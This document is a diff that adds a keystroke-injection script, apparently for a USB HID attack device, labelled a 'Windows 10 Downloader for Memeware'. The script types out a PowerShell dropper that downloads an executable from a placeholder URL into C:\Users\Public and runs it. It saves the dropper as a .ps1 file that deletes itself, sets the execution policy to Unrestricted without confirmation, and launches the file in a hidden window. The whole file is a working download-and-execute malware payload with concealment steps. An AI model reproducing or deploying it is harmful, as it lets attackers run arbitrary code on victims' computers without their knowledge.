@@ -1,0 +1,33 @@
+Rem:This is the Windows 10 Downloader for Memeware, this should work for your basic win10 box with user context privs.
+Rem:-----
+CustomDelay:200
+Press:131+114
+CustomDelay:1000
+Print:powershell Start-Process notepad
+Press:176
+Press:130+32
+CustomDelay:1000
+Press:176
+Print:(New-Object Net.Webclient).DownloadFile('http://URL',"C:\Users\Public\43461.exe"); Start-Process -FilePath "C:\Users\Public\43461.exe"
+Press:176
+Print:Remove-Item $MyINvocation.InvocationName
+Press:176
+Press:128+115
+CustomDelay:1000
+Print:C:\Users\Public\config-43461.ps1
+Press:176
+CustomDelay:1000
+Press:130+197
+CustomDelay:200
+Press:131+114
+CustomDelay:200
+Print:powershell Start-Process cmd
+Press:176
+Press:130+32
+CustomDelay:200
+Press:176
+Print:powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+Press:176
+CustomDelay:200
+Print:powershell.exe -windowstyle hidden -File C:\Users\Public\config-43461.ps1
+Press:176
